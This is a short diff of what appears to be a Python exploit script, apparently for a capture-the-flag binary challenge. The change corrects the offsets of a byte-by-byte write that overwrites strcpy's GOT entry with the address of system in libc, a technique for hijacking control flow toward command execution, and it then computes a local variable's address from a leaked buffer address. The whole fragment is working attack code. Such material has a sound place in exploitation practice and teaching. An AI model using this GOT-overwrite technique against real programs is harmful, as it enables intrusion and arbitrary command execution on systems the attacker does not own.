@@ -288,10 +288,10 @@ b0 = u64(SYSTEM_AT_LIBC) & 0xff
 send_payload_with_input(byte_write(u64(STRCPY_AT_GOT), b0, 18))
 
 b1 = (u64(SYSTEM_AT_LIBC) >> 8) & 0xff
-send_payload_with_input(byte_write(u64(STRCPY_AT_GOT), b1, 18)) 
+send_payload_with_input(byte_write(u64(STRCPY_AT_GOT) + 1, b1, 18)) 
 
 b2 = (u64(SYSTEM_AT_LIBC) >> 16) & 0xff
-send_payload_with_input(byte_write(u64(STRCPY_AT_GOT), b2, 18))
+send_payload_with_input(byte_write(u64(STRCPY_AT_GOT) + 2, b2, 18))
 
 ADDR_OF_IMPORTANT_LOCAL = u64(ADDR_OF_CONTROLLABLE_BUFFER) + 0x80 # this can be deduced from the disassembly
 print("Address of important local: ", p64(ADDR_OF_IMPORTANT_LOCAL)[::-1].hex())
